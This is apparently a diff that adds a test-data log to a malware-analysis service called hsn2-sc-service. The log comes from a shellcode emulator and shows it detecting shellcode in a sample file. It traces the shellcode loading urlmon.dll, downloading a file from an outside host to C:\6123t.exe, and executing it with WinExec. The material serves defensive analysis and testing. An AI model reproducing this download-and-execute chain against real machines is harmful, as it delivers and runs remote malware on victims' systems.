@@ -1,0 +1,12 @@
+Loaded 35e bytes from file /home/arturg/Projekty/hsn2/repo/hsn2/trunk/software/Services/hsn2-sc-service/testTmp/file-with-urls
+Initilization Complete..
+Max Steps: 2000000
+Using base offset: 0x401000
+[33;1mShellcode detected at offset = 0x003b
+[0m
+4010b3	LoadLibraryA(urlmon.dll)
+dd	URLDownloadToFile(http://user1.12-26.net/bak.css, C:\6123t.exe)
+f1	WinExec(C:\6123t.exe)
+[31;1m301ad655	 error accessing 0x301ad655 not mapped
+[0m
+Stepcount 228951
